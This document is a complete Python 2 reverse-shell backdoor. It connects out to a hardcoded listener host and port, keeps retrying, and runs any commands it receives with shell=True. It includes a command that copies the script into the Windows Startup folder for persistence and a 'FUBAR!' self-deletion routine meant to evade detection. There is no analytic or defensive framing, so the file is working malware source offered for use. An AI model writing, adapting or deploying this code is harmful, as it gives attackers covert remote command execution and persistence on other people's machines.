#!/usr/bin/env python
import subprocess, socket, sys, time, os, shlex
from random import randint

def fubar(platform):
	if platform == "nt":
		subprocess.Popen('DEL /F /S /Q /A '+sys.argv[0], shell=True)
	elif platform == "posix":
		subprocess.Popen('rm -rf '+sys.argv[0], shell=True)
	sys.exit(0)
	return

def winstart():
	appenv = os.getenv("APPDATA")
	data = 'copy "'+sys.argv[0]+'" "'+appenv+'\Microsoft\Windows\Start Menu\Programs\Startup"'
	return data

def main():
	# Change these values to match your listening host machine
	host = "192.168.1.168"
	port = 2015
	# This value corresponds to the time period in seconds in between connection attempts
	retry = 60
	hostname = str(socket.gethostname())
	platorm = os.name
	time.sleep(randint(3, 20))
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while True:
		try:
			sock.connect((host, port))
			break
		except Exception, e:
			time.sleep(randint(10, retry))
			pass
	sock.send("\n<Connection established to " + hostname + ", use 'qqq' to exit>\n")

	# try:
	while 1:
		sock.send("\n"+os.getcwd()+">")
		#Ensure this value is a (relatively) low power of 2
		data = sock.recv(4096)
		# Use this this to close the connection
		if data.startswith("qqq"):
			break
		if data.startswith("winstart!"):
			data = winstart()
			pass
		# If detected use this to delete the file from the machine, should work even if file is renamed (Experimental...)
		elif data.startswith("FUBAR!"):
				sock.send("Delete from: "+sys.argv[0]+"\n")
				fubar(platorm)
		# Working directory change 'hack'
		elif data.startswith("cd "):
			Dir = shlex.split(data)
			data = ""
			try:
				os.chdir(Dir[1])
			except:
				sock.send("Unknown Dir or Drive\n")
			pass
		process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_val = process.stdout.read() + process.stderr.read()
		sock.send(stdout_val)
	sock.close()
	time.sleep(randint(10, 30))
	main()
	# except:
	# 	pass

if __name__ == "__main__":
    main()	

#